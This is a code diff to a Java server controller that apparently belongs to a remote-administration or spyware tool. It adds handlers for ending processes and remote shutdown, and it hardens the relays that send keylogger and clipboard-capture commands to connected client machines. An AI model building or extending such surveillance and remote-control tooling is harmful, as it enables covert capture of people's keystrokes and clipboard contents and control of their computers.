@@ -31,6 +31,35 @@ public class Controller {
         put(COMMAND_GET_ALL_CLIENTS, Controller::getAllClients);
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_PROCESS, Controller::getProcess);
+        put(COMMAND_END_PROCESS, Controller::endProcess);
+        put(COMMAND_DO_NOTHING, Controller::doNothing);
+        put(COMMAND_NOTIFICATION, Controller::notify);
+        put(COMMAND_SHUTDOWN, Controller::shutdown);
+    }
+
+    private static void shutdown(JSON json, SocketModel model) {
+        ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
+        if (client == null) {
+            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
+            return;
+        }
+        client.onSend(json.toString());
+    }
+
+    private static void notify(JSON json, SocketModel model) {
+        Server.getHost().onSend(json.toString());
+    }
+
+    private static void doNothing(JSON json, SocketModel model) {
+    }
+
+    private static void endProcess(JSON json, SocketModel model) {
+        ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
+        if (client == null) {
+            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
+            return;
+        }
+        client.onSend(json.toString());
     }
 
     private static void getProcess(JSON json, SocketModel model) {
@@ -62,20 +91,30 @@ public class Controller {
     }
 
     private static void getKeylogger(JSON json, SocketModel model) {
-        if (model.getUUID().equals(Server.getHost().getUUID())) {
-            Server.getClientConnections().get(json.get("to")).onSend(new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_KEYLOGGER).json());
+        if (json.get("uuid").equals(Server.getHost().getUUID())) {
+            String temp = new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_KEYLOGGER).json();
+            ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
+            if (client != null) {
+                client.onSend(temp);
+                return;
+            }
+            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
             return;
         }
-
         Server.getHost().onSend(json.toString());
     }
 
     private static void getClipboard(JSON json, SocketModel model) {
         if (json.get("uuid").equals(Server.getHost().getUUID())) {
-            Server.getClientConnections().get(json.get("to")).onSend(new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_CLIPBOARD).json());
+            String temp = new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_CLIPBOARD).json();
+            ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
+            if (client != null) {
+                client.onSend(temp);
+                return;
+            }
+            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
             return;
         }
-
         Server.getHost().onSend(json.toString());
     }
 
